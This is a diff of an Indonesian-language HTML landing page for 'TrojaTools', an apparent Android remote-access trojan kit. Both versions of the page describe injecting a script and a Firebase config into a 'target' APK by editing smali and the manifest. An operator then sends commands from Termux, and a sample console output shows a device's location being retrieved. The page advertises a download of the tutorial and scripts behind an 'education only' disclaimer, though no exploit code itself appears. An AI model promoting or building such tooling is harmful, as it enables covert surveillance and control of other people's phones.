@@ -12,7 +12,6 @@
         :root {
             --bg-dark: #0a0a0a;
             --firebase-orange: #f5820d;
-            --primary-blue: #3b82f6;
         }
 
         body { 
@@ -49,153 +48,142 @@
             transform: translateY(-3px);
             box-shadow: 0 10px 25px -5px rgba(59, 130, 246, 0.5);
         }
+
+        /* Penyesuaian khusus untuk mobile */
+        @media (max-width: 640px) {
+            .hero-title { font-size: 2.5rem; line-height: 1.2; }
+        }
     </style>
 </head>
 <body class="antialiased">
 
-    <nav class="fixed w-full z-50 p-6">
-        <div class="max-w-6xl mx-auto flex justify-between items-center glass rounded-2xl px-8 py-4">
-            <div class="text-2xl font-extrabold tracking-tighter flex items-center gap-2">
+    <nav class="fixed w-full z-50 p-4 md:p-6">
+        <div class="max-w-6xl mx-auto flex justify-between items-center glass rounded-2xl px-5 py-3 md:px-8 md:py-4">
+            <div class="text-xl md:text-2xl font-extrabold tracking-tighter flex items-center gap-2">
                 <i class="fas fa-microchip text-blue-500"></i> Troja<span class="text-blue-500">Tools</span>
             </div>
             <div class="hidden md:flex space-x-8 text-sm font-semibold uppercase tracking-wider">
                 <a href="#about" class="hover:text-blue-400 transition">About</a>
                 <a href="#firebase" class="hover:text-orange-400 transition">Firebase</a>
-                <a href="#tutorial" class="hover:text-blue-400 transition">Tutorial</a>
+                <a href="#download" class="hover:text-blue-400 transition">Download</a>
             </div>
-            <a href="#download" class="btn-primary px-6 py-2 rounded-full text-xs font-bold uppercase tracking-widest">Get Project</a>
+            <a href="#download" class="btn-primary px-4 py-2 md:px-6 md:py-2 rounded-full text-[10px] md:text-xs font-bold uppercase tracking-widest text-white">
+                Download
+            </a>
         </div>
     </nav>
 
-    <header class="pt-48 pb-20 px-6">
-        <div class="max-w-5xl mx-auto text-center">
-            <div class="inline-block px-4 py-1 mb-6 glass rounded-full text-xs font-bold text-blue-400 border-blue-500/30 uppercase tracking-widest">
+    <header class="pt-32 md:pt-48 pb-16 px-6 overflow-hidden">
+        <div class="max-w-5xl mx-auto text-center relative">
+            <div class="inline-block px-4 py-1 mb-6 glass rounded-full text-[10px] md:text-xs font-bold text-blue-400 border-blue-500/30 uppercase tracking-widest">
                 Termux & Terminal Ready
             </div>
-            <h1 class="text-5xl md:text-8xl font-black mb-8 leading-tight">
-                Control Devices <br> via <span class="gradient-text text-white">Shell Access</span>
+            <h1 class="hero-title text-4xl md:text-8xl font-black mb-6 md:mb-8 leading-tight">
+                Control Devices <br> via <span class="gradient-text">Shell Access</span>
             </h1>
-            <p class="text-gray-400 text-lg md:text-xl mb-12 max-w-2xl mx-auto leading-relaxed">
-                Modifikasi aplikasi Anda, hubungkan ke Firebase, dan ambil kendali penuh melalui baris perintah terminal di mana pun Anda berada.
+            <p class="text-gray-400 text-base md:text-xl mb-10 md:mb-12 max-w-2xl mx-auto leading-relaxed">
+                Modifikasi aplikasi Anda, hubungkan ke Firebase, dan ambil kendali penuh melalui terminal di mana pun Anda berada.
             </p>
-            <div class="flex flex-wrap justify-center gap-4">
-                <a href="#download" class="btn-primary px-10 py-5 rounded-2xl font-bold flex items-center gap-3 text-lg">
+            <div class="flex flex-col md:flex-row justify-center gap-4">
+                <a href="#download" class="btn-primary px-8 py-4 md:px-10 md:py-5 rounded-2xl font-bold flex items-center justify-center gap-3 text-base md:text-lg text-white">
                     <i class="fas fa-download"></i> Download Tutorial
                 </a>
-                <a href="#tutorial" class="glass px-10 py-5 rounded-2xl font-bold hover:bg-white/5 transition flex items-center gap-3 text-lg border-white/20">
-                    <i class="fas fa-book-open text-blue-400"></i> Read Docs
+                <a href="#firebase" class="glass px-8 py-4 md:px-10 md:py-5 rounded-2xl font-bold hover:bg-white/5 transition flex items-center justify-center gap-3 text-base md:text-lg border-white/20">
+                    <i class="fas fa-fire text-orange-500"></i> Setup Firebase
                 </a>
             </div>
         </div>
     </header>
 
-    <section id="about" class="py-10 px-6">
+    <section id="about" class="py-10 px-4 md:px-6">
         <div class="max-w-4xl mx-auto terminal-box rounded-2xl overflow-hidden shadow-2xl">
             <div class="bg-[#1a1a1a] px-4 py-2 flex items-center gap-2 border-b border-white/5">
                 <div class="w-3 h-3 rounded-full bg-red-500"></div>
                 <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
                 <div class="w-3 h-3 rounded-full bg-green-500"></div>
-                <span class="ml-4 text-xs text-gray-500 font-mono italic">trojatools-console — 80x24</span>
+                <span class="ml-4 text-[10px] text-gray-500 font-mono italic">trojatools-console — 80x24</span>
             </div>
-            <div class="p-6 font-mono text-sm md:text-base leading-relaxed">
+            <div class="p-6 font-mono text-xs md:text-base leading-relaxed overflow-x-auto whitespace-nowrap md:whitespace-normal">
                 <p class="text-green-400">$ trojatools --init-config</p>
-                <p class="text-white text-opacity-40">[INFO] Loaded firebase_config.json...</p>
-                <p class="text-blue-400">[SUCCESS] Terminal connected to Database.</p>
+                <p class="text-white text-opacity-40">[INFO] Loading firebase_config.json...</p>
+                <p class="text-blue-400">[SUCCESS] Database connected.</p>
                 <p class="text-white mt-2">$ troja-cmd --device-id 001 --exec "get_location"</p>
                 <p class="text-yellow-400 italic">Requesting coordinates...</p>
-                <p class="text-white text-opacity-60">> Result: -6.2088, 106.8456 (Jakarta, ID)</p>
-                <p class="animate-pulse inline-block w-2 h-5 bg-white align-middle ml-1"></p>
+                <p class="text-white text-opacity-60">> Result: -6.2088, 106.8456</p>
+                <p class="animate-pulse inline-block w-2 h-4 bg-white align-middle ml-1"></p>
             </div>
         </div>
     </section>
 
-    <section id="firebase" class="py-24 px-6">
+    <section id="firebase" class="py-16 md:py-24 px-4 md:px-6">
         <div class="max-w-5xl mx-auto">
-            <div class="glass p-10 md:p-16 rounded-[3rem] border-l-8 border-orange-500 relative overflow-hidden">
-                <i class="fas fa-fire absolute -right-10 -top-10 text-[15rem] text-orange-500/5 rotate-12"></i>
+            <div class="glass p-8 md:p-16 rounded-[2rem] md:rounded-[3rem] border-l-4 md:border-l-8 border-orange-500 relative overflow-hidden">
                 <div class="relative z-10">
-                    <h2 class="text-4xl font-bold mb-6 flex items-center gap-4">
-                        <span class="p-3 bg-orange-500/10 rounded-2xl"><i class="fas fa-database text-orange-500"></i></span>
+                    <h2 class="text-3xl md:text-4xl font-bold mb-6 flex items-center gap-4">
+                        <span class="p-3 bg-orange-500/10 rounded-xl md:rounded-2xl"><i class="fas fa-database text-orange-500"></i></span>
                         Firebase Backend
                     </h2>
-                    <p class="text-gray-400 text-lg mb-8 max-w-2xl">
-                        Proyek ini sepenuhnya terintegrasi dengan **Firebase Realtime Database**. Ini memungkinkan sinkronisasi perintah secara instan antara terminal Anda dan aplikasi yang sudah dimodifikasi di HP target.
+                    <p class="text-gray-400 text-base md:text-lg mb-8 max-w-2xl leading-relaxed">
+                        Project ini menggunakan **Firebase Realtime Database** untuk sinkronisasi perintah instan. Anda harus melakukan setup project sendiri.
                     </p>
-                    <div class="grid md:grid-cols-2 gap-6 mb-10">
-                        <div class="bg-black/40 p-6 rounded-2xl border border-white/5">
-                            <div class="text-orange-400 font-bold mb-2 uppercase text-xs tracking-widest">Client Side</div>
-                            <p class="text-sm text-gray-400">Masukkan <code class="text-white">google-services.json</code> ke dalam APK menggunakan APK Editor/MT Manager untuk mengaktifkan sinkronisasi.</p>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6 mb-8">
+                        <div class="bg-black/40 p-5 md:p-6 rounded-2xl border border-white/5">
+                            <div class="text-orange-400 font-bold mb-2 uppercase text-[10px] tracking-widest">Client App</div>
+                            <p class="text-xs md:text-sm text-gray-400 italic">Sisipkan google-services.json ke APK target.</p>
                         </div>
-                        <div class="bg-black/40 p-6 rounded-2xl border border-white/5">
-                            <div class="text-blue-400 font-bold mb-2 uppercase text-xs tracking-widest">Console Side</div>
-                            <p class="text-sm text-gray-400">Konfigurasi API Key di terminal untuk mengirim perintah (payload) ke database secara realtime.</p>
+                        <div class="bg-black/40 p-5 md:p-6 rounded-2xl border border-white/5">
+                            <div class="text-blue-400 font-bold mb-2 uppercase text-[10px] tracking-widest">Terminal / CLI</div>
+                            <p class="text-xs md:text-sm text-gray-400 italic">Masukkan API Key ke file config.json.</p>
                         </div>
                     </div>
-                    <a href="https://console.firebase.google.com/" target="_blank" class="inline-flex items-center gap-2 text-orange-400 font-bold hover:underline">
-                        Open Firebase Console <i class="fas fa-external-link-alt text-xs"></i>
-                    </a>
                 </div>
             </div>
         </div>
     </section>
 
-    <section id="tutorial" class="py-20 px-6 bg-[#0c0c0c]">
+    <section class="py-16 px-6 bg-[#0c0c0c]">
         <div class="max-w-5xl mx-auto">
-            <h2 class="text-4xl font-black mb-16 text-center">Cara Penginstalan</h2>
-            <div class="grid md:grid-cols-3 gap-8">
-                <div class="space-y-4">
-                    <div class="text-5xl font-black text-white/10 italic">01</div>
-                    <h3 class="text-xl font-bold">Edit Aplikasi</h3>
-                    <p class="text-sm text-gray-500 leading-relaxed">Ikuti tutorial PDF untuk menyisipkan script troja ke dalam aplikasi target agar bisa menerima perintah dari Firebase.</p>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
+                <div class="text-center md:text-left">
+                    <div class="text-4xl font-black text-white/10 mb-2 italic">01</div>
+                    <h3 class="text-xl font-bold mb-2">Modifikasi APK</h3>
+                    <p class="text-sm text-gray-500">Edit smali dan manifest menggunakan panduan PDF.</p>
                 </div>
-                <div class="space-y-4">
-                    <div class="text-5xl font-black text-white/10 italic">02</div>
-                    <h3 class="text-xl font-bold">Setup Termux</h3>
-                    <p class="text-sm text-gray-500 leading-relaxed">Install python dan clone repository. Masukkan kredensial Firebase Anda ke dalam file config.</p>
+                <div class="text-center md:text-left">
+                    <div class="text-4xl font-black text-white/10 mb-2 italic">02</div>
+                    <h3 class="text-xl font-bold mb-2">Install Script</h3>
+                    <p class="text-sm text-gray-500">Clone repo di Termux dan jalankan setup python.</p>
                 </div>
-                <div class="space-y-4">
-                    <div class="text-5xl font-black text-white/10 italic">03</div>
-                    <h3 class="text-xl font-bold">Execution</h3>
-                    <p class="text-sm text-gray-500 leading-relaxed">Jalankan terminal dan mulai kontrol HP Anda melalui perintah teks sederhana tanpa menyentuh layar.</p>
+                <div class="text-center md:text-left">
+                    <div class="text-4xl font-black text-white/10 mb-2 italic">03</div>
+                    <h3 class="text-xl font-bold mb-2">Mulai Kontrol</h3>
+                    <p class="text-sm text-gray-500">Kirim perintah terminal dan pantau hasilnya.</p>
                 </div>
             </div>
         </div>
     </section>
 
-    <section id="download" class="py-24 px-6">
-        <div class="max-w-4xl mx-auto text-center glass p-12 md:p-20 rounded-[3rem] border-2 border-blue-500/20 shadow-[0_0_50px_-12px_rgba(59,130,246,0.3)]">
-            <h2 class="text-5xl font-black mb-6">Mulai Project Anda</h2>
-            <p class="text-gray-400 mb-12 text-lg">
-                Download file ZIP yang berisi **Tutorial PDF**, **Script Python**, <br class="hidden md:block"> dan **Konfigurasi Template** untuk Termux.
+    <section id="download" class="py-20 px-4 md:px-6">
+        <div class="max-w-4xl mx-auto text-center glass p-10 md:p-20 rounded-[2rem] md:rounded-[3rem] border-2 border-blue-500/20 shadow-2xl">
+            <h2 class="text-3xl md:text-5xl font-black mb-4 md:mb-6 leading-tight">Siap Beraksi?</h2>
+            <p class="text-gray-400 mb-8 md:mb-12 text-sm md:text-lg">
+                Download paket lengkap tutorial (PDF), Script Python, <br class="hidden md:block"> dan Template Firebase.
             </p>
             
-            <div class="flex flex-col md:flex-row justify-center items-center gap-6">
-                <a href="LINK_DOWNLOAD_ZIP_KAMU" class="btn-primary w-full md:w-auto px-12 py-6 rounded-2xl font-bold text-xl flex items-center justify-center gap-4">
-                    <i class="fas fa-file-zipper"></i> Download Files (.zip)
+            <div class="flex flex-col justify-center items-center gap-6">
+                <a href="LINK_DOWNLOAD_KAMU" class="btn-primary w-full md:w-auto px-10 py-5 rounded-2xl font-bold text-lg flex items-center justify-center gap-4 text-white">
+                    <i class="fas fa-file-zipper"></i> Download Project (.zip)
                 </a>
-                
-                <div class="text-gray-500 text-sm italic">
-                    Ukuran File: ~15 MB <br>
-                    Update: Feb 2026
-                </div>
-            </div>
-
-            <div class="mt-12 p-4 bg-yellow-500/5 rounded-xl border border-yellow-500/20 max-w-xl mx-auto">
-                <p class="text-xs text-yellow-500/70 leading-relaxed">
-                    <strong>PENTING:</strong> Proyek ini dibuat hanya untuk tujuan edukasi dan pembelajaran sistem Android. Penyalahgunaan untuk hal ilegal di luar tanggung jawab pengembang.
+                <p class="text-[10px] md:text-xs text-yellow-500/60 max-w-sm">
+                    Peringatan: Gunakan hanya untuk tujuan edukasi dan etis.
                 </p>
             </div>
         </div>
     </section>
 
-    <footer class="py-12 text-center">
-        <div class="opacity-30 text-xs tracking-widest uppercase mb-4">
-            TrojaTools Open Project — 2026
-        </div>
-        <div class="flex justify-center gap-6 text-gray-500">
-            <a href="#" class="hover:text-white transition"><i class="fab fa-github"></i></a>
-            <a href="#" class="hover:text-white transition"><i class="fab fa-telegram"></i></a>
-            <a href="#" class="hover:text-white transition"><i class="fab fa-youtube"></i></a>
+    <footer class="py-10 text-center border-t border-white/5">
+        <div class="opacity-30 text-[10px] tracking-widest uppercase mb-4">
+            TrojaTools Project — 2026
         </div>
     </footer>
 
